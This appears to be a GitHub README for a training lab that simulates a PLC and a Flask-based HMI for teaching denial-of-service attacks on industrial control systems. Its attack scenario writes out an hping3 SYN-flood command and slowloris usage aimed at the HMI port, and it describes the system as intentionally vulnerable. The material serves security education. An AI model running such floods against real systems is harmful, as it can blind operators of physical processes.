# Industrial Control System DoS Training Lab

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)

A realistic PLC-HMI simulation system for cybersecurity training, specifically designed to demonstrate Denial of Service (DoS) attacks on industrial control systems in a safe, contained environment.

## 🎯 Purpose

This project provides a hands-on training platform for:
- Understanding industrial control system architecture
- Learning DoS attack vectors against SCADA/HMI systems
- Practicing network security concepts in OT environments
- Demonstrating the impact of cyber attacks on industrial processes

## 🏗️ Architecture

```
┌─────────────────┐         ┌─────────────────┐
│   PLC Server    │◄────────┤   HMI Server    │
│   Port 5020     │  Socket │   Port 5000     │
│                 │         │   (Flask Web)   │
└─────────────────┘         └─────────────────┘
        │                            ▲
        │                            │
        │                    ┌───────┴────────┐
        │                    │   Web Browser  │
        └────────────────────┤   Operator UI  │
         Tank Physics        └────────────────┘
         Simulation
```

### Components

- **PLC (plc.py)**: Socket-based programmable logic controller simulator
  - Runs on port 5020
  - Simulates tank level control physics
  - Continues operation even when HMI is down
  
- **HMI (hmi.py)**: Flask-based Human-Machine Interface
  - Runs on port 5000
  - Serves web UI and REST API
  - Polls PLC every 100ms
  - **Attack Target**: Vulnerable to DoS attacks

- **Web UI (templates/index.html)**: Modern industrial SCADA interface
  - Real-time tank level monitoring
  - Pump and valve controls
  - Flow rate indicators
  - High/Low level alarms
  - Animated pipe flow visualization

## 🚀 Quick Start

### Prerequisites

- Python 3.8 or higher
- pip package manager
- Modern web browser

### Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/ics-dos-training-lab.git
cd ics-dos-training-lab
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

### Running the System

1. Start the PLC server (Terminal 1):
```bash
python plc.py
```
Output: `[PLC] Running on port 5020`

2. Start the HMI server (Terminal 2):
```bash
python hmi.py
```
Output: Flask server running on `http://0.0.0.0:5000`

3. Access the HMI:
```
http://localhost:5000
```

## 🎓 Training Scenarios

### Scenario 1: Normal Operation

1. Access the HMI interface
2. Click **START** to activate the pump
3. Observe tank level rising
4. Click **OPEN** to open the drain valve
5. Monitor flow rates and alarm indicators

### Scenario 2: DoS Attack Simulation

**Setup**: Kali Linux machine on the same network as the Windows VM running the HMI.

#### Using hping3 (SYN Flood)

```bash
# Install hping3 on Kali
sudo apt-get install hping3

# Launch SYN flood attack
sudo hping3 -S --flood -p 5000 <WINDOWS_VM_IP>
```

#### Using Slowloris

```bash
# Install slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

# Launch slowloris attack
python3 slowloris.py <WINDOWS_VM_IP> -p 5000
```

#### Expected Results

- ✅ **PLC continues running** on port 5020
- ❌ **HMI becomes unresponsive** (port 5000 flooded)
- ❌ **Operator loses visibility** into the process
- ⚠️ **Tank continues to operate** based on last commands

This demonstrates the critical importance of:
- Network segmentation
- Rate limiting
- Intrusion detection systems
- Redundant monitoring paths

## 📡 API Reference

### GET /api/data

Retrieve current system state.

**Response:**
```json
{
  "tank_level": 50.0,
  "pump_on": false,
  "valve_open": false,
  "flow_in": 0,
  "flow_out": 0
}
```

### POST /api/control

Send control commands.

**Request:**
```json
{
  "device": "pump",
  "action": "start"
}
```

**Devices**: `pump`, `valve`  
**Actions**: `start`, `stop` (pump) | `open`, `close` (valve)

## 🔧 Configuration

### PLC Physics Parameters

Edit `plc.py` to adjust simulation behavior:

```python
# Fill rate when pump is on
self.tank_level += 2.0  # % per cycle

# Drain rate when valve is open
self.tank_level -= 1.5  # % per cycle

# Evaporation rate
self.tank_level -= 0.1  # % per cycle
```

### HMI Polling Rate

Edit `templates/index.html`:

```javascript
// Poll backend every 100ms
setInterval(fetchState, 100);
```

## 🛡️ Security Considerations

**⚠️ WARNING**: This system is intentionally vulnerable for training purposes.

**Do NOT**:
- Deploy on production networks
- Expose to the internet
- Use in operational environments

**Recommended Setup**:
- Isolated virtual network
- VM-only environment
- No connection to real control systems

## 📚 Learning Objectives

After completing this lab, students will understand:

1. **ICS Architecture**: Separation between PLC logic and HMI visualization
2. **Attack Vectors**: How DoS attacks target operator interfaces
3. **Impact Analysis**: Loss of visibility vs. loss of control
4. **Defense Strategies**: Network segmentation, redundancy, monitoring
5. **Incident Response**: Detecting and mitigating DoS attacks on OT networks

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This software is provided for educational purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. The authors assume no liability for misuse of this software.

## 📧 Contact

For questions or feedback, please open an issue on GitHub.

---

**Educational Use Only** | **Not for Production Environments**
